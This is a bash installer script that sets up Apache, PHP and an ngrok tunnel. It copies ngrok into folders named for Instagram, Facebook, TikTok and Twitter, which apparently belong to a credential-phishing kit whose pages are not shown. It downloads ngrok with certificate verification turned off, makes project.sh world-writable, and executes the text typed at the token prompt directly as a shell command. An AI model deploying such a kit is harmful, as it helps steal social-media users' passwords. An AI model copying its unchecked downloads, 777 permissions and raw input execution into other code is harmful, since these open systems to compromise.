#!/bin/bash
echo ""
clear
echo ""
echo " ENTER NGROK "
sleep 2
clear
echo ""
echo  "DOWNLOAD REQUIREMENTS"   
echo ""
sudo apt-get install apache2 -y
apt install php -y
apt install tail -y
apt install curl -y
systemctl start apache2
apt install ruby -y
apt-get install ruby -y
apt install gem -y
gem install lolcat
apt install gnome-terminal -y
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
unzip ngrok-stable-linux-arm.zip
cp -R ngrok main/instagram/
cp -R ngrok main/facebook/
cp -R ngrok main/tiktok/
cp -R ngrok main/twitter/
chmod 777 project.sh
clear
echo ""
echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
echo ""
read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
sleep2
clear
echo "  Installation Successfull  "
sleep 4
clear




